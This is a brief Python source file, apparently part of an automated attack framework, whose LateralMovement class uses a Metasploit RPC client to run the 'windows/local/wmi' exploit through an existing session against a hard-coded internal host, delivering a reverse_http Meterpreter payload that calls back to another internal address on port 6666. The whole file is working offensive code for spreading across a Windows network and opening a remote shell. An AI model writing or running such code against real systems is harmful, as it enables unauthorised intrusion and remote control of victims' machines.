




class LateralMovement():
    
    knownIP = []

    def __init__(self, msfclient):
        self.msfclient = msfclient

    def lmove(self, sessionInput):
        lmove_exploit = ['windows/local/wmi']
        exploit = self.msfclient.modules.use('exploit', lmove_exploit[0])
        _payload = self.msfclient.modules.use('payload', 'windows/x64/meterpreter/reverse_http')
        exploit['RHOSTS'] = '192.168.2.119' #this needs to be dynamic
        exploit['SESSION'] = sessionInput
        _payload['LHOST'] = '192.168.2.108' #this needs to be dynamic or setup by a config file
        _payload['LPORT'] = 6666 #this needs to be dynamic or create a table of ports somewhere
                                 #jobs and sessions need to be logged and queried in order to check
        exploit.execute(payload=_payload)